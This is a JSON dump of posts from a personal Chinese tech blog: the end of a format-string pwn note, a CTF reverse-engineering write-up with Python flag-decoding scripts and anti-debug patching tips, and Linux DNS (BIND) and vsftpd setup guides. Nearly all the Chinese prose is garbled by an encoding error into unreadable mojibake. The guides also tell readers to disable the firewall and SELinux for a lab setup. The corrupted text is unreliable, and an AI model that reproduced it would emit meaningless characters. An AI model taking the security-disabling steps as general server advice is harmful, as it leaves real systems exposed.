¼å¼åŒ–å­—ç¬¦ä¸²ä¹‹åï¼Œå¯¼è‡´ç”¨ä¸äº†ã€‚ åœ¨é¢å¯¹å•æ¬¡printfï¼Œå®æ–½å¤šæ¬¡å†™å…¥çš„æ—¶å€™å…¶æ›´æ˜¾çš„ååˆ†æ— åŠ›ã€‚ è®°å½•åˆ°è¿™é‡Œï¼Œç†è®ºéƒ¨åˆ†å°±å·®ä¸å¤šå®Œäº†ï¼Œä¸‹ä¸€ç¯‡ä¸»è¦è®°å½•çš„å°±æ˜¯é¢˜è§£ç¯‡ï¼Œä¼šåŒ…å«ä¸€äº›æŠ€å·§ï¼Œå¸¸è§çš„ctfæ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ç›®æ¼æ´åˆ©ç”¨çš„å¸¸è§å¥—è·¯ï¼Œè¿˜æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„é«˜çº§åˆ©ç”¨ï¼ˆå½“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„bufåœ¨bssä¸Šï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬æ— æ³•ç›´æ¥å¾€æ ˆä¸Šå†™åœ°å€ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿå¹¶ä¸”è¿™ç§é¢˜ç›®å¸¸åœ¨èµ›é¢˜ä¸­å‡ºç°ï¼‰","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"å­¦ä¹ è®°å½•","slug":"å­¦ä¹ è®°å½•","permalink":"http://chumen77.xyz/tags/å­¦ä¹ è®°å½•/"}]},{"title":"XCTF\\_é«˜æ ¡æˆ˜ç–«èµ›\\_RE-å¤©æ´¥å“","slug":"XCTF_é«˜æ ¡æˆ˜ç–«èµ›_RE_ å¤©æ´¥å“","date":"2020-03-11T13:06:03.000Z","updated":"2020-08-10T07:31:37.179Z","comments":true,"path":"2020/03/11/XCTF_é«˜æ ¡æˆ˜ç–«èµ›_RE_ å¤©æ´¥å“/","link":"","permalink":"http://chumen77.xyz/2020/03/11/XCTF_é«˜æ ¡æˆ˜ç–«èµ›_RE_ å¤©æ´¥å“/","excerpt":"","text":"XCTF_é«˜æ ¡æˆ˜ç–«èµ›_RE_ å¤©æ´¥å“_å‰è¨€å¤ç°ä¸€ä¸ªé¢˜ï¼Œå½“æ—¶åªåšå‡ºæ¥ç¬¬ä¸€å±‚åŠ å¯†ã€‚å› ä¸ºè¿˜æ²¡æ€ä¹ˆæ¥è§¦åè°ƒè¯•è·Ÿä»£ç æ··æ·†ï¼Œåšä¸ä¸‹å»äº†ï¼Œä¸è¿‡ä¸‹æ¥å¤ç°å‘ç°äº†è¾ƒä¸ºç®€å•çš„åŠæ³•å‡ºæ¥è¿™ä¸ªé¢˜ï¼Œä¹Ÿæ˜¯å­¦åˆ°å¾ˆå¤šï¼Œå°±è®°å½•ä¸€ä¸‹ã€‚ åˆæ­¥è¿è¡Œå‘ç°è¿˜éœ€è¦è£…ä¸ªcgwin1.dllï¼Œè¿™ä¸ªå¾ˆå¥½æ‰¾ï¼Œä¸è¿‡è¦æ³¨æ„64ä½ç³»ç»Ÿï¼Œwindowsç›®å½•ä¸‹çš„system32 è·Ÿsyswow64éƒ½è¦æ”¾å…¥ã€‚çœ‹æ¥æ˜¯éœ€è¦è¾“å…¥åˆ¤æ–­ã€‚ idaåˆ†æè¿™é‡Œå°±æ˜¯ç¬¬ä¸€å±‚éªŒè¯äº†ï¼Œåæ¥äº†è§£åˆ°è¿™ä¸ªæ˜¯smcåŠ å¯†ï¼Œæˆ‘æ˜¯ç›´æ¥å†™Pythonä¸€ä½ä½çˆ†ç ´å‡ºæ¥çš„ã€‚ v39 = 'Rising_Hopper!' result = '' key = [17,8,6,10,15,20,42,59,47,3,47,4,16,72,62,0,7,16] tag = [0x52,0x69,0x73,0x69,0x6E,0x67,0x5f,0x48,0x6f,0x70,0x70,0x65,0x72,0x21] for i in range(len(key)): x = 0 flag = 1 while flag: if ~(x &amp; tag[i % 14]) &amp; (x | tag[i % 14])==key[i] : flag = 0 result += chr(x) else: x += 1 print(result) #result = 'Caucasus@s_ability' ç„¶åè¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œå‘ç°è¿™é‡Œæ ¹æ®åˆšåˆšè§£å‡ºæ¥çš„å­—ç¬¦ä¸²ï¼Œä¼ å…¥åå¯¹*Unk_10040164D * åšäº†ä¸€äº›å¤„ç†ç„¶ååˆè¿”å›åˆ°è¿™å †æ•°æ®ã€‚ç›´æ¥è·Ÿè¿›å»æ˜¯æ²¡ä»€ä¹ˆç”¨çš„ã€‚æ‰€ä»¥éœ€è¦åŠ¨æ€è°ƒè¯•ï¼Œçœ‹çœ‹ç¨‹åºè¿è¡Œåˆ°è¿™é‡Œï¼Œæ˜¯æ€ä¹ˆæ ·çš„ã€‚ ç„¶åä¼šå‘ç°ï¼ŒidaåŠ¨æ€è°ƒè¯•ç›´æ¥æ–­æ‰äº†ï¼Œè‚¯å®šæ˜¯æœ‰åè°ƒè¯•äº†ã€‚x64å¯ä»¥è°ƒè¯•ï¼Œä½†æ˜¯å®šä½å…³é”®å¤„æœ‰ç‚¹éš¾ï¼Œå¹¶ä¸”çœ‹æ±‡ç¼–ä»£ç ä¹Ÿè®©è‡ªå·±è¿™ä¸ªèœé¸¡çœ‹åäº†ã€‚æ‰€ä»¥å°±æƒ³åŠæ³•ç ´é™¤å¯¹idaçš„åè°ƒè¯•ï¼Œç„¶ååˆ°äº†å…³é”®ä»£ç ä¹Ÿå°±æ˜¯å¤„ç†ä»¥åçš„Unk10040164Dï¼Œçœ‹çœ‹é€»è¾‘æ˜¯ä¹Ÿæƒ³åŠæ³•å°†å…¶æ”¹å˜æˆä¼ªä»£ç ï¼Œè¿™æ ·å°±å¥½åˆ†æå¤šäº†ã€‚ patchç¨‹åºï¿¼è·Ÿè¿›å…¥å¼•ç”¨å‡½æ•°ï¼Œå‘ç°æ˜¯åˆ©ç”¨çª—å£äº‹ä»¶æ¥æ£€æµ‹æ˜¯å¦è¢«è°ƒè¯•å™¨è°ƒè¯•ã€‚å¹¶ä¸”åœ¨å…¶ä¸­ä¹Ÿå‘ç°äº†idaï¼Œè¿™é‡Œpatchç¨‹åºå¯ä»¥ç”¨010editorï¼Œç›´æ¥æŠŠidaçš„ç›¸å…³å­—çœ¼æ”¹æˆå…¶ä»–çš„å°±è¡Œã€‚ä½†æ˜¯è¦æ³¨æ„ä¸è¦ç ´åå…¶ä»–çš„æ•°æ®ï¼šï¿¼æˆ‘èµ·åˆæ”¹æˆè¿™æ ·å°±ä¸è¡Œï¼Œä½ä½å¯¹é½ï¼Œæ”¹æˆå…¶ä»–å­—ç¬¦ä¸²å°±å¥½äº†ã€‚ idaåŠ¨æ€è°ƒè¯•ï¼šæ–­åœ¨è¿™é‡Œï¼Œç„¶åè¿›å…¥è¿™å…¥Unk10040164D å‡½æ•°çš„æ—¶å€™ï¼ŒF7è¿›å…¥ï¼šå‘ç°å·²ç»æœ‰æ­£å¸¸çš„æ±‡ç¼–ä»£ç å‡ºæ¥äº†ï¼ˆè¿™é‡Œæˆ‘çš„æ˜¯å·²ç»ä¿®æ”¹è¿‡çš„ï¼‰ï¼Œæ— æ³•f5åç¼–è¯‘ï¼Œè¿™æ—¶å€™å¯ä»¥åœ¨æœ€åˆæ®µpush rbp ä¸Šé¢ï¼Œå³é”®æ–°å»ºä¸€ä¸ªå‡½æ•°ï¼šæ•´å®Œçš„æ ·å­ï¼šç„¶åå°±å¯ä»¥f5åç¼–è¯‘äº†ï¼Œå¹¶ä¸”å¾ˆæ¸…æ™°çš„å°±å¯ä»¥çœ‹å‡ºç¨‹åºé€»è¾‘ï¼šç„¶åè§£å¯†è¿™é‡Œï¼š flag = '' key = [2007666,2125764,1909251,2027349,2421009,1653372,2047032,2184813,2302911,0x2289F9,1909251,2165130,1968300,0x223D16,2066715,2322594,1987983,0x223D16,1869885,2066715,0x2289F9,1869885,0xEB773,0xE6A90,0xE6A90,0xE6A90,728271,1869885,0x2289F9,2283228,0x223D16,2184813,2165130,2027349,1987983,0x223D16,1869885,2283228,2047032,1909251,2165130,1869885,2401326,1987983,0x223D16,2184813,885735,2184813,2165130,1987983,2460375] for i in range(51) : flag += chr(int(key[i] / 19683)) print(flag) ç„¶åå°±æ‹¿åˆ°flagäº†ã€‚æ¯”èµ·å¾ˆå¤šå¤§å¸ˆå‚…çš„dumpæ ¸å¿ƒä»£ç ï¼Œå†è¿›è¡Œåˆ†æï¼Œå¯¹æˆ‘æ¥è¯´è¿˜æ˜¯å¤ªéš¾äº†ã€‚æ„Ÿè§‰åœ¨idaé‡Œåˆ°å…³é”®å¤„ï¼Œåˆ›å»ºå‡½æ•°ï¼Œç”Ÿæˆä¼ªä»£ç æ›´ç®€å•ï¼Œä¹Ÿå¾ˆæ¸…æ™°ã€‚","categories":[],"tags":[{"name":"RE","slug":"RE","permalink":"http://chumen77.xyz/tags/RE/"}]},{"title":"linux- DNSæ­å»ºè®°å½•","slug":"linux_ DNSæ­å»ºè®°å½•","date":"2020-03-11T06:20:55.000Z","updated":"2020-04-15T14:18:11.128Z","comments":true,"path":"2020/03/11/linux_ DNSæ­å»ºè®°å½•/","link":"","permalink":"http://chumen77.xyz/2020/03/11/linux_ DNSæ­å»ºè®°å½•/","excerpt":"","text":"DNSå…¨ç§°ï¼š domain name system åŸŸåæœåŠ¡åŸºç¡€DNSä½œç”¨åŠç±»å‹DNS ç³»ç»Ÿçš„ä½œç”¨ ï¼š æ­£å‘è§£æï¼šæ ¹æ®ä¸»æœºåç§°ï¼ˆåŸŸåï¼‰æŸ¥æ‰¾å¯¹åº”çš„ IP åœ°å€ï¼ˆæœ€å¸¸è§ï¼‰ åå‘è§£æï¼šæ ¹æ® IP åœ°å€æŸ¥æ‰¾å¯¹åº”çš„ä¸»æœºåŸŸåï¼ˆé€šä¿¡è¡Œä¸šå¸¸ç”¨ï¼‰ DNS ç³»ç»Ÿçš„å·¥ä½œæ¨¡å¼ï¼š é€’å½’æŸ¥è¯¢ ï¼šè®¿é—®å¿…é¡»æœ‰ä¸€æ¬¡ä¸€å›ï¼Œä¼šè¿”å›æˆåŠŸæˆ–è€…å¤±è´¥ã€‚ è¿­ä»£æŸ¥è¯¢ ï¼šå¤šæ¬¡è®¿é—®ï¼Œå¤šæ¬¡è¿”å›ï¼Œå¿…é¡»è¿”å›ä¸€ä¸ªæ­£ç¡®çš„åœ°å€ã€‚åŸŸåç»“æ„ï¼šå…¨ä¸–ç•Œæœ‰13å°æ ¹åŸŸåæœåŠ¡å™¨ã€‚BINDè½¯ä»¶æœåŠ¡ æœåŠ¡åï¼šnamed ç«¯å£å·ï¼š53 ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/named.conf ä¿å­˜ DNS è§£æè®°å½•çš„æ•°æ®æ–‡ä»¶ä½äºï¼š/var/named/ ä¸»é…ç½®æ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼šlisten-on port 53 &#123; 127.0.0.1; &#125;; //è¦å¡«å…¥è‡ªå·±ä¸»æœºip listen-on-v6 port 53 &#123; ::1; &#125;; allow-query &#123; any; &#125;;//æ„æ€æ˜¯ç»™ä»»ä½•ç½‘æ®µè¿›è¡Œè§£æ åˆ†åˆ«æ˜¯: ipv4ç›‘å¬ç«¯å£å’Œipåœ°å€ï¼Œé»˜è®¤åªæœ‰æœ¬åœ°çš„ ipv6çš„ç›‘å¬ç«¯å£å’Œipåœ°å€ recursion yes; // é€’å½’è¿˜æ˜¯è¿­ä»£æŸ¥è¯¢ dnssec-enable yes; dnssec-validation yes; dnssec-lookaside auto; è¿™ä¸ªæ˜¯dnsæ§åˆ¶é˜²æ­¢æ¬ºéª—ç”¨æˆ·ã€‚ä½†æ˜¯å› ä¸ºå…¶åŠ ä¸Šäº†åŒ…çš„éªŒè¯ï¼Œå†ä¼ ç»™æœåŠ¡å™¨æ—¶å€™ï¼ŒæœåŠ¡å™¨è¿›è¡Œæ‹†åŒ…éªŒè¯ï¼Œä¼šå¢åŠ æœåŠ¡å™¨çš„è´Ÿè·ï¼Œæ‰€ä»¥ç”¨çš„ä¸å¤šã€‚ åŒºåŸŸæ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š zone \"baidu.com\" IN &#123; type master; file \"baidu.localhost\"; //æœ¬æœºè®°å½•æ–‡ä»¶åç§°ï¼ˆå¯ä»¥diyï¼‰ allow-update &#123; none; &#125;; &#125;; //æ­£å‘ zone \"131.140.168.192.in-addr.arpa\" IN &#123; type master; file \"baidu.empty\"; allow-update &#123; none; &#125;; &#125;; //åå‘ //å¯¹äºå…¶ä¸­ file è‡ªå®šä¹‰çš„åå­—ï¼Œè¦ä¸æ•°æ®é…ç½®æ–‡ä»¶é‡Œé¢åå­—ç›¸åŒã€‚ å®éªŒæ­å»ºè¿‡ç¨‹è¦æ±‚ï¼šwwwä¸»æœºè§£æä¸º172.16.10.5ï¼›ftpä¸»æœºè§£æä¸º172.16.10.6ï¼šmailä¸»æœºè§£æä¸º172.16.10.8ï¼šDNSä¸»æœºè§£æä¸ºæœ¬æœºIP172.16.10.9ï¼›æ·»åŠ æ³›è§£æè®°å½•ï¼›åŒæ—¶æ·»åŠ wwwçš„åˆ«åè®°å½•ns1 æœåŠ¡å™¨ä¸»æœºå…³é—­é˜²ç«å¢™ã€SELinuxvi /etc/selinux/config æŠŠæ”¹æˆ SELINUX = disabled ç„¶åsetenforce 0 systemctl stop firewalld.service å…³é—­é˜²ç«å¢™ã€‚ é…ç½®ä¸»é…ç½®æ–‡ä»¶ï¼švi /etc/named.conf ï¿¼æ³¨æ„åˆ†å·ä¸è¦å¿˜è®°ï¼Œipå¡«çš„æ˜¯æœ¬æœºåœ°å€ã€‚ é…ç½®åŒºåŸŸæ–‡ä»¶vi /etc/named.rfc1912.zones zone \"chumen77.com\" IN &#123; type master; file \"chumen77.localhost\"; allow-update &#123; none; &#125;; &#125;; zone \"10.16.172.in-addr.arpa\" IN &#123; type master; file \"chumen77.loopback\"; allow-update &#123; none; &#125;; &#125;; å…¶ä¸­æ³¨æ„åå‘è§£ææ—¶ï¼Œipåœ°å€çš„åå†™ï¼Œè¿˜æœ‰å†™åˆ°ipåœ°å€ç¬¬ä¸‰ä¸ªæ®µã€‚ å¹¶ä¸”æ­£å‘è§£æå’Œåå‘è§£æçš„æ–‡ä»¶åå­—è¦ç»™è®°ä½ï¼Œä¸€ä¼šéœ€è¦å»æŒ‰åç§°é…ç½®çš„ã€‚ é…ç½®æ­£å‘åå‘è§£ææ•°æ®æ–‡ä»¶cp -p /var/named/named.localhost /var/named/chumen77.localhost cp -p /var/named/named.empty /var/named/chumen77.loopback -p æ˜¯ç”¨æ¥å¤åˆ¶æ–‡ä»¶çš„æƒé™æƒ…å†µã€‚ æ¥æ‹·è´ä¸€ä¸‹ï¼Œæ–¹ä¾¿ç›´æ¥ä¿®æ”¹ã€‚ æ­£å‘è§£ææ–‡ä»¶ ï¼š $TTL 1D @ IN SOA chumen77.com. rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS dns.chumen77.com. www IN A 172.16.10.5 ftp IN A 172.16.10.6 mail IN A 172.16.10.8 dns IN A 172.16.10.131 ns1 IN CNAME www * IN A 172.16.10.10 åå‘è§£ææ–‡ä»¶ï¼š $TTL 3H @ IN SOA chumen77.com. rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS dns.chumen77.com. 5 PTR www.chumen77.com. 6 PTR ftp.chumen77.com. 8 PTR mail.chumen77.com. 131 PTR dns.chumen77.com. * PTR xxx.chumen77.com. æ³¨æ„æ¯ä¸ªç½‘å€åé¢è¦åŠ ä¸ªç‚¹ã€‚ æ£€æŸ¥å’Œå¼€å¯named-checkzone å¯ä»¥å¯¹ä¸Šé¢4ä¸ªé…ç½®æ–‡ä»¶è¿›è¡Œè¯­æ³•é—®é¢˜çš„æ£€æŸ¥ï¼Œå‡ºç°okå°±æ˜¯æ²¡ä»€ä¹ˆé—®é¢˜äº†ã€‚ systemctl start named å¼€å¯æœåŠ¡ï¼Œå¦‚æœå‡ºç°æ— æ³•å¼€å¯ï¼Œæœ‰å¼‚å¸¸ï¼š cat /var/log/messages ç”¨è¿™ä¸ªå‘½ä»¤å»æŸ¥é‚£ä¸ªé…ç½®æ–‡ä»¶é‡Œé¢çš„å†…å®¹å¡«é”™äº†ï¼Œç„¶åæ”¹ä¸€ä¸‹å°±okäº†ã€‚ å®¢æˆ·æœºè®¾ç½®ç½‘å¡è®¾ç½®vi /etc/sysconfig/network-scripts/ifcfg-ens33 ä¿®æ”¹ç½‘å¡ä¿¡æ¯ ï¼š DNS1=192.168.140.131 è¦åœ¨æœ€ååŠ ä¸Šä½ dnsæœåŠ¡å™¨çš„ipã€‚æ³¨æ„æ˜¯ DNS1. è®¾ç½®å¥½åé‡å¯ç½‘å¡ã€‚ service network restart æµ‹é€Ÿæ˜¯å¦æˆåŠŸä½¿ç”¨ä¸€ä¸‹ nslookup æ­£å‘åå‘éƒ½æˆåŠŸäº†ã€‚","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://chumen77.xyz/tags/linux/"}]},{"title":"linux\\_ftpæœåŠ¡æ­å»ºè¸©å‘è®°å½•","slug":"linux_ftpæœåŠ¡æ­å»ºç®€å•è®°å½•","date":"2020-03-11T05:46:50.000Z","updated":"2020-06-15T15:06:23.691Z","comments":true,"path":"2020/03/11/linux_ftpæœåŠ¡æ­å»ºç®€å•è®°å½•/","link":"","permalink":"http://chumen77.xyz/2020/03/11/linux_ftpæœåŠ¡æ­å»ºç®€å•è®°å½•/","excerpt":"","text":"linux_ftpæœåŠ¡æ­å»ºç®€å•è®°å½•_å‰è¨€ç®€å•è®°å½•ä¸€ä¸‹ï¼Œftpçš„ç›¸å…³éœ€è¦è®°å½•çš„çŸ¥è¯†è·Ÿæ­å»ºæ‰€è¸©çš„å‘ã€‚ ä¸¤ç§æœåŠ¡æ¨¡å¼ ä¸»åŠ¨æ¨¡å¼ï¼šFTPæœåŠ¡å™¨ä¸»åŠ¨å‘å®¢æˆ·ç«¯å‘èµ·è¿æ¥è¯·æ±‚ã€‚ è¢«åŠ¨æ¨¡å¼ï¼šFTPæœåŠ¡å™¨ç­‰å¾…å®¢æˆ·ç«¯å‘èµ·è¿æ¥è¯·æ±‚ï¼ˆFTPçš„é»˜è®¤å·¥ä½œæ¨¡å¼ï¼‰ã€‚vsftpdæœåŠ¡ç¨‹åºftpæ˜¯Linuxç³»ç»Ÿä¸­ä»¥å‘½ä»¤è¡Œç•Œé¢çš„æ–¹å¼æ¥ç®¡ç†FTPä¼ è¾“æœåŠ¡çš„å®¢æˆ·ç«¯å·¥å…·ã€‚æˆ‘ä»¬é¦–å…ˆæ‰‹åŠ¨å®‰è£…è¿™ä¸ªftpå®¢æˆ·ç«¯å·¥å…·ï¼Œä»¥ä¾¿åœ¨åç»­å®éªŒä¸­æŸ¥çœ‹ç»“æœã€‚vsftpdä½œä¸ºæ›´åŠ å®‰å…¨çš„æ–‡ä»¶ä¼ è¾“çš„æœåŠ¡ç¨‹åºï¼Œå…è®¸ç”¨æˆ·ä»¥ä¸‰ç§è®¤è¯æ¨¡å¼ç™»å½•åˆ°FTPæœåŠ¡å™¨ä¸Šã€‚ åŒ¿åå¼€æ”¾æ¨¡å¼ï¼šæ˜¯ä¸€ç§æœ€ä¸å®‰å…¨çš„è®¤è¯æ¨¡å¼ï¼Œä»»ä½•äººéƒ½å¯ä»¥æ— éœ€å¯†ç éªŒè¯è€Œç›´æ¥ç™»å½•åˆ°FTPæœåŠ¡å™¨ã€‚ æœ¬åœ°ç”¨æˆ·æ¨¡å¼ï¼šæ˜¯é€šè¿‡Linuxç³»ç»Ÿæœ¬åœ°çš„è´¦æˆ·å¯†ç ä¿¡æ¯è¿›è¡Œè®¤è¯çš„æ¨¡å¼ï¼Œç›¸è¾ƒäºåŒ¿åå¼€æ”¾æ¨¡å¼æ›´å®‰å…¨ï¼Œè€Œä¸”é…ç½®èµ·æ¥ä¹Ÿå¾ˆç®€å•ã€‚ä½†æ˜¯å¦‚æœè¢«é»‘å®¢ç ´è§£äº†è´¦æˆ·çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥ç•…é€šæ— é˜»åœ°ç™»å½•FTPæœåŠ¡å™¨ï¼Œä»è€Œå®Œå…¨æ§åˆ¶æ•´å°æœåŠ¡å™¨ã€‚ è™šæ‹Ÿç”¨æˆ·æ¨¡å¼ï¼šæ˜¯è¿™ä¸‰ç§æ¨¡å¼ä¸­æœ€å®‰å…¨çš„ä¸€ç§è®¤è¯æ¨¡å¼ï¼Œå®ƒéœ€è¦ä¸ºFTPæœåŠ¡å•ç‹¬å»ºç«‹ç”¨æˆ·æ•°æ®åº“æ–‡ä»¶ï¼Œè™šæ‹Ÿå‡ºç”¨æ¥è¿›è¡Œå£ä»¤éªŒè¯çš„è´¦æˆ·ä¿¡æ¯ï¼Œè€Œè¿™äº›è´¦æˆ·ä¿¡æ¯åœ¨æœåŠ¡å™¨ç³»ç»Ÿä¸­å®é™…ä¸Šæ˜¯ä¸å­˜åœ¨çš„ï¼Œä»…ä¾›FTPæœåŠ¡ç¨‹åºè¿›è¡Œè®¤è¯ä½¿ç”¨ã€‚è¿™æ ·ï¼Œå³ä½¿é»‘å®¢ç ´è§£äº†è´¦æˆ·ä¿¡æ¯ä¹Ÿæ— æ³•ç™»å½•æœåŠ¡å™¨ï¼Œä»è€Œæœ‰æ•ˆé™ä½äº†ç ´åèŒƒå›´å’Œå½±å“ã€‚å®‰è£…yum -y install vsftpd é…ç½®æ–‡ä»¶ä¸»é…ç½®æ–‡ä»¶è·¯å¾„ ï¼š /etc/vsftpd/vsftpd.conf å¸¸ç”¨çš„é…ç½®å‚æ•°ä»¥åŠä½œç”¨å¦‚ä¸‹ï¼š å‚æ•° ä½œç”¨ listen=[YES|NO] æ˜¯å¦ä»¥ç‹¬ç«‹è¿è¡Œçš„æ–¹å¼ç›‘å¬æœåŠ¡ listen_address=IPåœ°å€ è®¾ç½®è¦ç›‘å¬çš„IPåœ°å€ listen_port=21 è®¾ç½®FTPæœåŠ¡çš„ç›‘å¬ç«¯å£ download_enableï¼[YES|NO] æ˜¯å¦å…è®¸ä¸‹è½½æ–‡ä»¶ userlist_enable=[YES|NO] è®¾ç½®ç”¨æˆ·åˆ—è¡¨ä¸ºâ€œå…è®¸â€è¿˜æ˜¯â€œç¦æ­¢â€æ“ä½œ userlist_deny=[YES|NO] è®¾ç½®ç”¨æˆ·åˆ—è¡¨ä¸ºâ€œå…è®¸â€è¿˜æ˜¯â€œç¦æ­¢â€æ“ä½œ max_clients=0 æœ€å¤§å®¢æˆ·ç«¯è¿æ¥æ•°ï¼Œ0ä¸ºä¸é™åˆ¶ max_per_ip=0 åŒä¸€IPåœ°å€çš„æœ€å¤§è¿æ¥æ•°ï¼Œ0ä¸ºä¸é™åˆ¶ anonymous_enable=[YES|NO] æ˜¯å¦å…è®¸åŒ¿åç”¨æˆ·è®¿é—® anon_upload_enable=[YES|NO] æ˜¯å¦å…è®¸åŒ¿åç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ anon_umask=022 åŒ¿åç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„umaskå€¼ anon_root=/var/ftp åŒ¿åç”¨æˆ·çš„FTPæ ¹ç›®å½• anon_mkdir_write_enable=[YES|NO] æ˜¯å¦å…è®¸åŒ¿åç”¨æˆ·åˆ›å»ºç›®å½• anon_other_write_enable=[YES|NO] æ˜¯å¦å¼€æ”¾åŒ¿åç”¨æˆ·çš„å…¶ä»–å†™å…¥æƒé™ï¼ˆåŒ…æ‹¬é‡å‘½åã€åˆ é™¤ç­‰æ“ä½œæƒé™ï¼‰ anon_max_rate=0 åŒ¿åç”¨æˆ·çš„æœ€å¤§ä¼ è¾“é€Ÿç‡ï¼ˆå­—èŠ‚/ç§’ï¼‰ï¼Œ0ä¸ºä¸é™åˆ¶ local_enable=[YES|NO] æ˜¯å¦å…è®¸æœ¬åœ°ç”¨æˆ·ç™»å½•FTP local_umask=022 æœ¬åœ°ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„umaskå€¼ local_root=/var/ftp æœ¬åœ°ç”¨æˆ·çš„FTPæ ¹ç›®å½• chroot_local_user=[YES|NO] æ˜¯å¦å°†ç”¨æˆ·æƒé™ç¦é”¢åœ¨FTPç›®å½•ï¼Œä»¥ç¡®ä¿å®‰å…¨ local_max_rate=0 æœ¬åœ°ç”¨æˆ·æœ€å¤§ä¼ è¾“é€Ÿç‡ï¼ˆå­—èŠ‚/ç§’ï¼‰ï¼Œ0ä¸ºä¸é™åˆ¶ åœ¨é…ç½®ç€çš„æ—¶å€™ï¼Œæ³¨æ„å¯¹åœ¨è¿™é‡Œå¯¹åº”èµ·æ¥ï¼Œæ¥æ§åˆ¶åŒ¿åæ¨¡å¼è·Ÿæœ¬åœ°ç”¨æˆ·çš„éƒ¨åˆ†æƒé™ã€‚ å¼€å¯vsftpdæœåŠ¡service vsftpd start systemctl start vsftpd è¸©å‘è®°å½•0x1 ï¼šå› ä¸ºæ˜¯å®éªŒæœºï¼Œéšä¾¿æŠ˜è…¾ï¼Œä¸ºäº†å®éªŒçš„æˆåŠŸï¼Œéœ€è¦å…³é—­é˜²ç«å¢™ å’ŒSELinuxæœåŠ¡ã€‚ é˜²ç«å¢™ï¼šCentOS7.0ç‰ˆæœ¬çš„linuxç³»ç»Ÿçš„é˜²ç«å¢™æ˜¯firewalldï¼Œå…¶ä»–ç‰ˆæœ¬çš„å¯èƒ½æ˜¯iptablesã€‚firewalldé˜²ç«å¢™å…³é—­ä»£ç ï¼š å…³é—­é˜²ç«å¢™systemctl stop firewalld.service æ°¸ä¹…ç¦æ­¢é˜²ç«å¢™ systemctl disable firewalld.service æ£€æŸ¥é˜²ç«å¢™çŠ¶æ€ systemctl status firewalld.service æç¤ºï¼šActive: inactive (dead)å°±è¡¨ç¤ºå…³é—­äº†ã€‚ iptablesé˜²ç«å¢™å…³é—­ä»£ç  ï¼š æŸ¥è¯¢é˜²ç«å¢™çŠ¶æ€ : service iptables status åœæ­¢é˜²ç«å¢™ : service iptables stop å¯åŠ¨é˜²ç«å¢™ : service iptables start é‡å¯é˜²ç«å¢™ : service iptables restart æ°¸ä¹…å…³é—­é˜²ç«å¢™ : chkconfig iptables off æ°¸ä¹…å…³é—­åå¯ç”¨ : chkconfig iptables on SELinuxæœåŠ¡ï¼šsetsebool -P ftpd_full_access=onå•ç‹¬å¤„ç†ftpdã€‚ æˆ–ï¼šå…³é—­SELinux $ vi /etc/selinux/config å°† SELINUX=XXX â€“&gt;XXX ä»£è¡¨çº§åˆ«æ”¹ä¸º** SELINUX=disabled**ç„¶åé‡å¯ç³»ç»Ÿï¼Œæˆ–è€…æ‰§è¡Œå‘½ä»¤ï¼šsetenforce 0ã€‚ 0x2:å‘ç°åŒ¿åç”¨æˆ·ï¼Œåœ¨è¿ä¸ŠftpæœåŠ¡å™¨æ—¶å€™ï¼Œæ— æ³•è¿›è¡Œå†™å…¥ä¸œè¥¿ã€‚ 550 Permission denied. ç„¶åè¿™ä¸ªç›®å½•æ˜¯: /var/ftp/pub è¿™å°±æ˜¯æŠŠè¿™ä¸ªpubçš„å±ä¸»æ§åˆ¶ä¸º æ§åˆ¶ä¸ºftpå³å¯ã€‚ chown ftp pub è¿™æ ·å°±å¯ä»¥äº†ã€‚ 0x3:åœ¨æœ¬åœ°ç”¨æˆ·çš„æ—¶å€™ï¼Œç”¨rootä¹Ÿæ˜¯æ— æ³•è¿æ¥ftpæœåŠ¡çš„ã€‚è¿™æ˜¯å› ä¸ºvsftpdæœåŠ¡ç¨‹åºæ‰€åœ¨çš„ç›®å½•ä¸­é»˜è®¤å­˜æ”¾ç€ä¸¤ä¸ªåä¸ºâ€œç”¨æˆ·åå•â€çš„æ–‡ä»¶ï¼ˆftpuserså’Œuser_listï¼‰æŠŠftpusersè¿™é‡Œé¢çš„rootå»æ‰å³å¯ã€‚ 0x4: åœ¨é‡‡ç”¨æœ¬åœ°ç”¨æˆ·æ¨¡å¼ç™»å½•FTPæœåŠ¡å™¨åï¼Œé»˜è®¤è®¿é—®çš„æ˜¯è¯¥ç”¨æˆ·çš„å®¶ç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè®¿é—®çš„æ˜¯/home/linuxprobeç›®å½•(ç³»ç»Ÿåˆ›å»ºçš„ç”¨æˆ·ï¼Œåœ¨homeæ–‡ä»¶å¤¹ä¸‹éƒ½æœ‰å¯¹åº”ç”¨æˆ·åçš„æ–‡ä»¶å¤¹)ã€‚è€Œä¸”è¯¥ç›®å½•çš„é»˜è®¤æ‰€æœ‰è€…ã€æ‰€å±ç»„éƒ½æ˜¯è¯¥ç”¨æˆ·è‡ªå·±ï¼Œå› æ­¤ä¸å­˜åœ¨å†™å…¥æƒé™ä¸è¶³çš„æƒ…å†µã€‚å¦‚æœè¯»å†™æƒé™æ²¡ç»™ï¼Œæ‰‹åŠ¨è®¾å®šï¼Œç»™è¯»å†™æƒé™ã€‚ 